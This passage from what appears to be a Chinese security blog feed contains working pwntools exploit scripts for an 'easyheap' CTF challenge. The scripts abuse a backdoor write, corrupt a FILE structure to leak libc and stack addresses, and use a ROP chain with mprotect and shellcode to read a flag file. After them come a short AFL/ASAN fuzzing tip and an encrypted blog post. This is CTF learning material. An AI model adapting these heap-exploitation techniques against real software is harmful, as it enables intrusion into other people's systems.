class="hljs-number">0x5000</span>, p16(<span class="hljs-number">0x100</span>))<br><br><span class="hljs-comment"># 通过 mmap 泄露 libc </span><br>backdoor(<span class="hljs-number">0x21000</span>, <span class="hljs-number">0x212690</span>, p64(<span class="hljs-number">0xfbad3887</span>))<br>backdoor(<span class="hljs-number">0x21000</span>, <span class="hljs-number">0x212690</span>+<span class="hljs-number">0x22000</span>+<span class="hljs-number">0x20</span>, p8(<span class="hljs-number">0</span>))<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ec980</span><br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br><br><span class="hljs-comment"># 通过 environ 泄露栈返回地址</span><br>backdoor(<span class="hljs-number">0x10</span>, <span class="hljs-number">0x4070</span>-<span class="hljs-number">0xcb0</span>-<span class="hljs-number">0x5000</span>, p64(libc_base+<span class="hljs-number">0x1ed6a0</span>))<br>edit(<span class="hljs-number">2</span>, p64(<span class="hljs-number">0xfbad3887</span>) + p64(libc_base + <span class="hljs-number">0x1ef600</span>) * <span class="hljs-number">4</span> + p64(libc_base + <span class="hljs-number">0x1ef608</span>) * <span class="hljs-number">2</span>)<br>ret_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x120</span><br>success(<span class="hljs-string">&#x27;ret_addr -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(ret_addr)))<br><br><span class="hljs-comment"># 栈溢出</span><br>pop_rdi = libc_base + <span class="hljs-number">0x23b72</span><br>pop_rsi = libc_base + <span class="hljs-number">0x2604f</span><br>pop_rdx_r12 = libc_base + <span class="hljs-number">0x119241</span><br>mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>payload = p64(pop_rdi) + p64(ret_addr &amp; <span class="hljs-number">0xfffffffff000</span>) <br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0x2000</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">7</span>)*<span class="hljs-number">2</span> + p64(mprotect)<br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>, <span class="hljs-number">0</span>)<br>shellcode += shellcraft.read(<span class="hljs-number">3</span>, ret_addr, <span class="hljs-number">0x30</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>, ret_addr, <span class="hljs-number">0x30</span>)<br><br>backdoor(<span class="hljs-number">0x200</span>, <span class="hljs-number">0x4088</span>-<span class="hljs-number">0xfb0</span>-<span class="hljs-number">0x5000</span>, p64(ret_addr))<br>edit(<span class="hljs-number">5</span>, payload+p64(ret_addr+<span class="hljs-number">0x48</span>)+asm(shellcode))<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="远程爆破exp"><a href="#远程爆破exp" class="headerlink" title="远程爆破exp"></a>远程爆破exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>binary = <span class="hljs-string">&#x27;./easyheap&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index, content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;4.delete\n&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Idx?&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendafter(<span class="hljs-string">&#x27;Context:\n&#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params">size, offset, content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;4.delete\n&#x27;</span>, <span class="hljs-string">&#x27;666&#x27;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;gift&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> p.recvline():<br><span class="hljs-keyword">raise</span> <span class="hljs-string">&quot;once again&quot;</span><br>p.sendlineafter(<span class="hljs-string">&#x27;Size?&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>p.sendlineafter(<span class="hljs-string">&#x27;Offset?\n&#x27;</span>, <span class="hljs-built_in">str</span>(offset))<br>p.sendafter(<span class="hljs-string">&#x27;Context:\n&#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>distance = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>) * <span class="hljs-number">0x1000</span><br><span class="hljs-comment"># change backdoor_time -&gt; 0x100</span><br>backdoor(<span class="hljs-number">0x10</span>, <span class="hljs-number">0x4014</span>-<span class="hljs-number">0x8f0</span>-distance, p16(<span class="hljs-number">0x100</span>))<br><br><span class="hljs-comment"># change edit_time -&gt; 0x100</span><br>backdoor(<span class="hljs-number">0x10</span>, <span class="hljs-number">0x4010</span>-<span class="hljs-number">0xa00</span>-distance, p16(<span class="hljs-number">0x100</span>))<br>success(<span class="hljs-string">&#x27;distance -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(distance)))<br><span class="hljs-comment"># mmap leak libc addr </span><br>backdoor(<span class="hljs-number">0x21000</span>, <span class="hljs-number">0x212690</span>, p64(<span class="hljs-number">0xfbad3887</span>))<br>backdoor(<span class="hljs-number">0x21000</span>, <span class="hljs-number">0x212690</span>+<span class="hljs-number">0x22000</span>+<span class="hljs-number">0x20</span>, p8(<span class="hljs-number">0</span>))<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ec980</span><br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br><br><span class="hljs-comment"># environ leak stack addr</span><br>backdoor(<span class="hljs-number">0x10</span>, <span class="hljs-number">0x4070</span>-<span class="hljs-number">0xcb0</span>-distance, p64(libc_base+<span class="hljs-number">0x1ed6a0</span>))<br>edit(<span class="hljs-number">2</span>, p64(<span class="hljs-number">0xfbad3887</span>) + p64(libc_base + <span class="hljs-number">0x1ef600</span>) * <span class="hljs-number">4</span> + p64(libc_base + <span class="hljs-number">0x1ef608</span>) * <span class="hljs-number">2</span>)<br>ret_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x120</span><br>success(<span class="hljs-string">&#x27;ret_addr -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(ret_addr)))<br><br>backdoor(<span class="hljs-number">0x200</span>, <span class="hljs-number">0x4088</span>-<span class="hljs-number">0xfb0</span>-distance, p64(ret_addr))<br><br>pop_rdi = libc_base + <span class="hljs-number">0x23b72</span><br>pop_rsi = libc_base + <span class="hljs-number">0x2604f</span><br>pop_rdx_r12 = libc_base + <span class="hljs-number">0x119241</span><br>mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>payload = p64(pop_rdi) + p64(ret_addr &amp; <span class="hljs-number">0xfffffffff000</span>) <br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0x2000</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">7</span>)*<span class="hljs-number">2</span> + p64(mprotect)<br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>, <span class="hljs-number">0</span>)<br>shellcode += shellcraft.read(<span class="hljs-number">3</span>, ret_addr, <span class="hljs-number">0x30</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>, ret_addr, <span class="hljs-number">0x30</span>)<br>edit(<span class="hljs-number">5</span>, payload+p64(ret_addr+<span class="hljs-number">0x48</span>)+asm(shellcode))<br>p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            local = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> local:<br>                p = process(binary)<br>                libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                p = remote(<span class="hljs-string">&#x27; &#x27;</span>, )<br>                libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>            exp()<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>:<br>            p.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>AFL Tips</title>
    <link href="/2022/04/25/AFL-Tips/"/>
    <url>/2022/04/25/AFL-Tips/</url>
    
    <content type="html"><![CDATA[<h2 id="规避ASAN的memory-leaks"><a href="#规避ASAN的memory-leaks" class="headerlink" title="规避ASAN的memory leaks"></a>规避ASAN的memory leaks</h2><p>在afl+asan fuzz某些程序的时候，编译时或fuzz时偶尔会出现memory leak的情况，配置以下环境变量即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">ASAN_OPTIONS</span>=detect_leaks=0<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">ASAN_OPTIONS</span>=<span class="hljs-string">&quot;detect_leaks=0:abort_on_error=1:symbolize=0:exit_code=:symbolize=0&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>二进制安全求职</title>
    <link href="/2022/03/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E6%B1%82%E8%81%8C/"/>
    <url>/2022/03/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E6%B1%82%E8%81%8C/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="77e392316222f2f390a12f236f350031606684baa5af09749baac82e70673f4b">9b1d862a7beb9e771dd89081b43a131b7fdc0946bb5677dfb99671af64d6c106175267cd5e726151108caad41657e7d5d6bcebba814e0888cf3e3ee034232db3eb9cc098a77b9de5b8bcb2abceae5f12d34afc3d4ba7aec0857a37b39bb4cdf71e5e1c8059cb318d2aa10c1ee9c71ee71ad0e774a9cef73bc41b9d8db83ac936f4054ae95547c19d8320c3582b40d5cea63d3a4f3a49a27e993e7c2c27851bf17fea8f4e6309580217026fc167f89f29091fd78abd37f6e9fd87c69f109776b6c60017e525f16d6cc48d92cf2a207da332618ab4356836690d262f935c859e5038ca3fd8794797ce89619a2335dd4d63a7382e8e358a542b7b8beb43ddee60452d352033bf6e62ee9caff040cc4e3acce4962e62216749ad80eb476cc86c3d2c81ff807e1ba350d14f39726540a99ec8195665f84524aa789a22d43e592967e4d36d279bec4c887f10c708a59bdfdc44234715c5d22119f1bd967e5a30da0d49819877581122655b76252d86d44886bb54f54b324f32cf7466ec9862bdb56107c70ae40e753f5fa327a21bea9891a330b41f1bc26eca6b6706789abbfbf456ac6120d95fa16f6e5e34cac5ab11bc20645e2d7bb89393db18004cbe008b4f33cb0531e3273b3d9c7cb9bc02b56ac8a1ac159d3a55283eb084c333c9036c73ccd47d509d69cadbad147e653b885cd6ca534a25cbf60633859527532f7b5ebe8a11209a46ac37768a8e64affb967f95b3c474f68982d6c269a17120bcf10eb375cd495e0acfc8b65c4d77ccd2d6eb1b17c68681a64378e77b4670a9599f61070a81ef5a0a3f160eeba3256c349fea31cee81688b280ddbcb17e271a4874513d8a217e02571667f3286ae6380e8424b86efd6bf022cdf1c72998a7247073fd7bd21861310c9c34922bc4b0d1d1bec0ca899c295a012335dce082797b2385ab15495909c37f34994774dd0746c18e153babeeca1d38552c7abc50f8e9f1c938fdae9f8b018acfc5d858e965191eb3a2abcac44cef61755853299730ecc02f3fc2f65e287e5e0d531e8bf6e3eab8db1a7efebc76363ec8d5c25a353c33a0f207825d462176e8b95ab086e46dd03de6f99a358f5984095b01bd4dfe8ef783c4aaa1cd00698179eef870383ce5c79075cbb1585d8491a2aef68e6c1133bc2ae5f81c928793c5620a254c9fa0c8fd0a3108c9492e8edfc89471042c486efd0adf115f13fa8bb8a08a48570dcbe5169b51a3a31cd6ec32766e2febac17645bab5320ffcdce3631449ef3285248e142a7631554a25086e68883c199dd56451a865c41e946058e261a88575153a209e01e781957e2895bd73f50620b0ec8ae216e089153be7dfd2ece273f043b68f4ea26754eeec04e9d72b97ee850a7c2e3d248b0df7966ee54bde05f116d494f0792edebaaee5667e539bc3ae03c0d35928578df6101aa8fff85a3a122d86c2b0164e53cea6f89e0a0d230b9982faaf6c8605f25f4bbadbdc261c17a8b5d7bf05eda4bc8aac132f55ab7110f2f9ffa17729fa8119ae2e582953ba4da87979c38d421f362c626d6b7e3d05f954bc6fae95226f5812e148682578d0e1bc6154d05b1bbef0a076eb386727785084655b5e1bd63943a11787317e333f24d0fa253d6642bb86f1e149897bbcd722369dd366c63a3552ea6c5179df4fc0f82c088b0f7e864cf640a815658b56fad1af09a7d273b015d0621174f7014666e56690b82259470a714e831fc8722850f2c14248d94820c25527ff3e351eaad5ffa1aa5b33f1aed75833c4bde5353f87eac81c4a6db06ef44477ebf4fd2c79ee2a33e80c126ad80281544798b980e630ba60ff5797da44570067754b0facc2d5ada70705996455bf5e2fc8e64c5f7b87be8f03876d75db8352e5d453f06886262a6ac4d9e13408bd51e6a631100a1f3f83531664a3e9850ad9b5af2b8a2044b22455ae343b88fc235dccd653b2c275603fc8a24931f81801003b19620497496e85ee1ccdb42a3c2224915c6f314da9f5e4a5edbe72f3f56f2519cd686715d31097941cda16abf9431b4d27041e4e0e340808279de20a32232627b33948935dbb6bcc2686418b11d68146d007d2c9b2b799e86accab4dab21069c67bde796b20a10771371b967d42702120fc89a53bb72b1456857122bb8bec79712bc2c6f469e9d4bf5eb7d5922adb4a91d26f813716ec77f0f0a2198f5d46056fd0a5015e1c98176ba5331e2f1bcd0ec1ca49ccb811eeb9b9012d1b6a6881abfb7a56bf7a35ffd84e7921fbb472cb139d88f265c1c9aca49d6424c039d40c46c54823744f26fbc63f49af6ab94b1fb24ab10fa7d0b64e3e32849530d2ae71924fd719dfe2e4619b05a63678b1de81118329bad9b1271b85d2a6f1d747c1eb8c50171f002c433599ffc2a3ebe1dc499a421d91af6a28fd5e21c3a227dc5850a63902703a5343d771e25eabb324aad0cfde830bb752033a0530023bb306122d33657b2b4a22819a80c49a5e3c5df58869fdfca66468b7051916930ec805060579efda5088ae83e3b8cd6f8ead3b0ce0093d23ed850f6060cacc07cf7ca6b766c781b46c308ba32db0d7583844359fbff5592a08fd3a69256ca1c45528aef82a0fe941bde00c5ee67faace8916bfca98ac6f10a5152320b209aea0957263281164d389b5fe624b47ae55c0d8f2fbabbe3c20a3d8b8d7ce14f274241f6209c46a36a8f2e8a970b6db25d100bbdcfa10e0b61b000d00aaea280d1c1af7b3d0c47a83871cdf868813ceb8c7f43e4e6268c1b87f707807d925749a1abe71edaa0c366a259f02c3889685b2c5aa8e9a46be9b4a18a19c5295dbf16bd313146c1435d09c21f2c97951ac652088d2a299473f027958e60d0bf5a56d433860459d649dd55e5867f6b25e71ea364bc3e6c48b893b739cd16e7f3fb2c5d690a95964f617cb0f1bc007828939df347683494651e679b63da08b1f2ce5fcd7a6229972f5816120902689d84194979c511d9aa4d50fb9c1549e0c298de116242defbece369eca351287318a82891066840e503a6c3090d4b24f6933497a1da5f85012d174a98b18d3db38f869a8502ffc819be4312f1d839161acc1d1cd70c343a3fa1c1643c32f4a78bc4a145d692d88460b2aeb1ed3ac1c47eb44240f2607f780ecb918ff223dee86594ca239da94336ab712b20e05e5872a177990c7b2bd8dc555a60d257da8122c613e2d8f6cd5efeafaa7f080a6791a0455d02fa0ec0bf7b614abb9464feb28119fc435c2fdfc29bae70c8046d070d505323aeea5e43d0b77c3a293b79dc076635f8cf9d4c05d6eda74e3b3c29d2dd26f2feb0421b06c69db1332026295d557ac7d9177bf975e7e1e01dcea735744955d6a4c128832fc1b315e050bbb2bb15954356a754cd8f4f32f0dfa3eebec10b53aab9204052a0e2b5c1cd4cb5ca12a32d1638e0280d84c4f05600f94067f5f8cf29844edc29759acf7f5816f08d4238f810a027b17df75edfbc7e311de1634941be67d1bb3d6d320737f0150934b6966923996cb7731660a66ff49e6845fcb6e11ae8693cd2c4fe28cdece6b4548843c449b2ec4cbd52b5fb5dbbd0c4579b6c2a64015c78a3fc1aed076943d32e67c6809440c6443d5a398b83e182f7e316dcfb1d145042558c1d63dd56e7dac94e07055a2c38c11d8b10c824304de6be58690f3d4f9fe1fdab31d2d2d097191e9f252b878fbd1d0a90176e06e011f4e6103a3c00031e4820f134207c102941221e81faeeddcc822156cb87880778e4b883b2cf48c0e3e6e2efc9cd200d07cf672f9ffeffd8964c44d696996d1f7a5a83b368ddf599d31ca3189e4e27a79ed1b288d270c5ae7139bf7302a441b96309da89dcfd43ffdae15ac977ad89495f058996cec59d668cfb882e7e721b50ce8a93a07e77af762c7b577c09227e63e08a31c364b3138b86a04004526c206c1397e2b1bd35cd2ec566f87532f421930770179eb35b18bac44975e8308e523e3cf128dc9063032d6fb2b19cf8d642a297530a671be8b2b0bbe4baa7575a1328fc45eb176da585cd50b1e8257e80adc179fa63cb8af4fef1b1cabcffd36faed490b2ac8e121f29fed04003a5241a14be51dd4a0ad1c165a10fc89ee855f220e07ebfd15c5093f1080f746c4e429bd490a78449b7a076ef54f3865fcd1d6ce827c7002341d95df5cce8f787966bf7e22306722c7b7f9f44900fb7c76ddc2766220339c7914e3fcd8efc2d52d20ed20e3bf8d67c8cc9e1d39476c51726c3473bfce5e9e003aeda39563c4c0d69f5dd2a5ec404c9d9f7635d3134d5951c0c536f81132ba47b1301c22a4c7cd4b83b2ec1a1695f853f1a7ec22861216e9de433ae3d46702b9be0e58b3fa2426941d45cefa40c8179083c1f5ad4261767b19175254ef37581a6dc8775c571985f82d325e811570b661bdcfbe6f1c5246a9db1176c6996063dd1da04e180fe4b0441578723307cd2bed7e14935c26acf867e935777a77f8451f226295d8dd7f225ea1c7ee25564c5d9bc75ddd08fb20b5d6f7aa8e179bbd62b7d9e2bc2fae985d487cc70a38bc1d8d20965ef77bb3282fc5c872a8c08fc48e715f919de07a5f8210e1253f2b04f0b30470b93d285d0688630c935ef9994d63e1d25e3c954dbdf6af99104f498312349bb9721501ac2ba1ea96b2bd33b01556828da49c7558b6ddd76616649367b31fbeac4a1c3e3499ec8c41b8aebeaaa3545eb147367b3a3e264cd8c1ce5601058c305bcb3ecccd078a9ea9cc5a27f531a01b0bc7477342f81ee1de22e42d4913b42444dd5b4825db890a890f6c975ed33eb5523027f8959025a3432fe8ab677a8c2885f45c018656a63fdcfd77622d2a4c63e298caabced7fd9d5c0e1da2c58325e36e9f1d1e406f56745897dd004214c6b881ecbd42f0d3058afe406e463bd6bdaa645b9d53d85e20ee137aec64e8f5b291ecbf5ecdfcda4bb90ee14c5c2cc2f3612586479462c2030a9604a12c536fe08ee11c03b5b1d05de70a777b6bcfccc854b3168c0c396bc1c8cf63fc4ce19230afbf0740af16ffa59e08a1610ca39a4e73c71a84b837a9ab2c99359ed35cffb6f50ec6894c606f78cc61a2e31585d6c0fad9d64b83d345714bfa0e1739f4440d467c741fcd1b23385208bbbf43bd8ea59cfaa42fb846a2c70e3d8a4b6f6339e16c4911c8aa8fbcf759e6ee0c61bb2fa694533ad1b9619626e4b2da2e597021c9635076ab5697a14d90e9d728303b261294cc13d268ef52f7474fa45fba0bc2fb16a61f1c72f6c5de933dbb0e73ceced0e5cd76c62b54aa0f1312e091fb2aa74a78c3ce46448406b7d8e5e0371b0fa1661b3da827ef83d5836b725207bd91a7f3e47d6d49424a5b81006c69830b58432e1e428f6a91f5c2e2c387e68030f81cd74a01289ffc8dc9ce988deaf0c127b40c2e79c3c590f9a838e40bfaee84973b4041b89f62f5040931c3dd2be0e841adb969dddfc16a3fb958598545edf2e4e594b622ff7940003531c110b939462cad2bfbc341e6395f07dc4a7cf896ff6aba8381ba7e1d9e194ce158a67a524bb3c9ceaaa29dac59975b4d3c068c0fdc8c4a87dfe34c0979f97efb9208f89609a107a1074e4ba8d51480d17f0b80b6c2731a8317cedc3b45852b59f86cb8410c7d6cb5feb9fa76d86b8a218e26cca8b0ba91ee94b5d3837af151a19098b9b8ee6b4160a731f77e68568b1fa521895a47e96e61e4211544e729eb06072ef42d8c1e77d21028cc1b31ba0b97968702b7de035a8daebc19258a1c6d4f12212ec438171e5cd0c737f5ff8d4cbcbbed6cb426931664a89408cc92f06e1a4b6793944020a3da1ba3423f0f2afb78a5c13ee0157589a2a69a57da07002b6e4aad4fbafc2b6f230bf87d59d1fc5a9b5c8961a2e4e5305a773abf80fd62c7b5c2b20059e5ce9588c0fb873213bc3010c28c7b1796b16ef89d1d36f8f77a0477432a93ee3ab146292d502336579c8f7ae937348cecc5c6bfa07d7dcb644ce7999d297ca1310571d563158f6ce7fdfccfc5706cf703c418c8e1ad8f4245210fa229b6d6425a614275019ebd572e186735147e55c4cf4f6bc7c9f34092fe74e0f00acbd79eba5ef6eaccdbfde4bbae2265dc550f34e697ba828906ae1c976badfbbffd56d328ab1b09448e9f421fa596d1704f6251d9338e737ee3e03e492997eeb8c5487fe50ebdd05f5ba360a702e597d518c25f6ed18dfc6c9d26fb6c04532051333ad1f05cd96b4359a872438348efce8ec526ea67f46608ee9dfde475447b1b09f9308d075a48b411e5adae76280599e690df5e79e95294cba56a0883c929d76c589e58ed4be16aa52f44f155b8e23d601a33258382470e7d518df6d671ac7f25622c46c44f3361180e34956d25aac5c2cb30642cc3223d1cfb4ea153dc778ccacd423ed3a56b29615193567a36ddf6da4bbf9c6d6c4a95a7c77da62a088f48f326f8f5dcb5e9ae74d9be566262b8e11a79e164c7180cf22e8acb5bcdb5acedb3fb0681603c05869d993cababac570a9afdbeb33704882e0bccb28edaef227b5f53648942fcbb6c1d1706805c4e9a47de8b571dd8f62d76a2364905c42016281099f8cb602da8e8799b59be2e787bc0332787df6ade333f8f0e27a0de8e0cac8acb1939dc246db1b762c7d65ea572b46d0b74c59055606123e4ac9ededb823b87da83d19ef6313c612f1a1421ba1589d2eeeec07e8b6a29f3db732c6ea538419b34a2d05dc5b6cab4f32bdcd63f1234ca523c673761900eb943b5f2d43042354f84f990c87d677aeb4d839d4553fe53cc5e973a4ba2ef02efbe6926e3b727b38011b48efe00d73cec8abf305a74f810667c22c419d1cfed03a2594f56ff6c19d57d2ec79727b2865808ccb71f04072c01743fb41da5b4b0e9a99643a24925d3883c58ee57092f39af079079da9827a1c76c604cc82999c257bda8b7459cc3a1a50ecd6bc876a176f9d66cec56f8aa6e04317023db99e5b3d9d667735c0ba5f9f54959c00e236672bceb65bcab954e5197ca21a1c0e23386d5ac90a02be7509d0362d5a0b9f29fefb62aa896f031aaadfdc95e13079411b7a6f5a0a47d75a33373b3a0498f4439a86769a36014a3d93866d7afcfe9307d02116b9dabe55b8605c464b75b8c062a63a52589be8e66d7638a994958458d4f4abf2d5e46798b4c4aecc0eebf33577ca53b68cf12a24c731781da0fef0335eb25c167193e1c4860392e4b7df94de5419fbf318d2bb129882beb92d69972ad0c104adac8314b6ac55d691cc08098017e81ac30b1e5ef351fe899644c8566ff56b6b9c5dbc6f85a2e20baa0588de9990668d320a874704714de2b2f1989ce0edddd364b97668f5a6136cb6e2573a6c676fdaf94adbd76e2b4252d5c7b01b00b57d71118f4280be1e23e9cce0481d133e2bfab0fe8b0455b82a620defa683d7b82c4e86b09d2d7a1b621b0ebbde6c0018356a71d15d50280573594425a6ef322d100ab8a1a1118b9430451e5f60401324bc69adf2e60b6a63ea725d37894a2a934ee88ccea887d5e5c4c5708c83024627b20f93219416df7f2a044f9d3b2954c28fedbed8ef1b7f57cf1bcf343b067dd24749160f8c3633ef551a7d78d043f9754f8cb714e107e3c81376890adb8cdfc6686babcfc0addbe95ea4d844f7f8e552cc5431e5c735530f9439f8f37e2a48cab10249b9b76604b94a207b81600215386f17d815aed21e31c34138647a7ecc9d600e9034a35ac11baa46d22c5d7c915853a9e603d2503a0b2f0024dade549b2193a73f7c0afd85b78d6c1b2c4451fb4a706aa19a1c1160345a7347a5b4332e5288ee0847fd9fd871edd948ab8f2ebc224500d86b853b1fedef6783254dfc465dab8e2c683245654418f17e1744a6b1f174ca7edcf4c1f42e49289223c0b993666ae7768884d6b25c3f19d1bda3631b49483c5e40fbae91c458edf8e00af47f3656134b689cf31829da179efa7b412adc33b112cda45da03fc5b965152c7486712f052a5f9ee2ea3365c75629a8f3bcd4d3c34ce3795f28958f6662c3d3237432085d0951072a60aa8806d26caa18fbd8b2710fa151ca302733d2e4cbfe893d0341f01d260f233614d964d56d5388ae743a015c93bd62bfadead0aa41933a151a3e449b9c1ebebb0183b594ed22301b012a68fe52ed45097d5d48a55d348ad92d9ef7a61111538b9efebd1e497a4a39a0bec385d55581cfc8fe03fd0bcd9c1df34f39f5f6ed649e99b46893a42b035b552a65eca85cfe176e203518a679cee9e18ac8e9746e4af0268006a463794401ed2bde547fa99b810ca51962f94caa866c602faa1d2439db16e442a39fbafeee710e53fc823e98038382f3c5a745a5d0d8c34b315af5865f91a0074e84519e4c1bc4a97391314af9c58da1cf4ff63224d2b5f02ba705de7ff920ea42e77f7c899849c02ef4e3b39bfb6a85025e34c8824891955f31c6524d235dd23b8bba5884499de80b8f2a417353b11beec21767d54f94e3df81e07742027dcd3f25276d5735f92930c6aa93542ddccd1fb51b3507f997d91b413b10322911745ca41f1407253283ec9dd6832430d8c19ecd933c24aa28facb4a1ad6f47a336cba914f394b9c82fb72d39a54a681fa4607c03b4ad49c03f1dd42e74c921700d3958370affc053a5ac3a0d15961898510111fd9c85bff211b1d1441165267a3793ec2de9c801572f1dcb2ceb599eeabe9693852fdab1ae521427341307e8c270a5bba1792df5723d788aaef1a9e3adf80e88e8cd92b3425ae8ff48bb69717cf7a96166933df0514fc5c77937e844bd9161645ae67f861c47d4a99859f81a4bb2c5f417f7a409b564f8b06e5e957cf8c7e7354f187a2e0568373f46f477af5bd37cb87ce85ebfa5cc9126da73ff2b47bbd75ce941d74ea801fbceab3dd52f0731a557e0d7e5135e707d6bff59ca489d9c9b4c0050061bbfc76e9e2bb3af4df9eba8b96d4a1f5190c7ebdef13004d3f92ab1337f89b79b948c356d675842821c8038242e87ab3d8f1717d6145ff6ded7b75c2d1354e94f902fd5aec2ce1f4cba5d36e2af3988e07e402d12d72501be0f9035e1fcc193e249c310cbae2cdda85579d4d9fb472db7ff578363255e15c9611ba9973e406fe27b37b4b212f7c20e40ed61607c0f07b9b3c39aa4ce9f8bd91e2f919dfeae059a07e377ed2a9e7882dfd0198576caaa490a27c22849da3a7273fc36782a945d5d42c90f9ef742ad29a26bb616f5ca7556805e8b6f3a1fd4564769bb268077a7a3f1fbda3acb9a3c5e7d2956c530e3b940588684d09af1655fd6a90e7595af6